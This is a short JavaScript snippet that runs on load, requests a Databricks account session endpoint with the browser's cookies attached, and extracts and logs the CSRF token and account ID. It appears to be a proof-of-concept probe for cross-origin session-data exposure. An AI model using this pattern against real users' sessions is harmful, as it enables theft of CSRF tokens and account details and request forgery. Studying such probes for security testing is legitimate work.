// This JS runs immediately when loaded
(async () => {
  try {
    const res = await fetch("https://accounts.cloud.databricks.com/session", {
      method: "GET",
      credentials: "include"   // send cookies automatically
    });

    const data = await res.json();
    console.log("Session response:", data);

    // Example extraction
    const csrf = data.csrfToken;
    const accountId = data.accountId;

    console.log("CSRF:", csrf);
    console.log("Account ID:", accountId);

  } catch (err) {
    console.error(err);
  }
})();
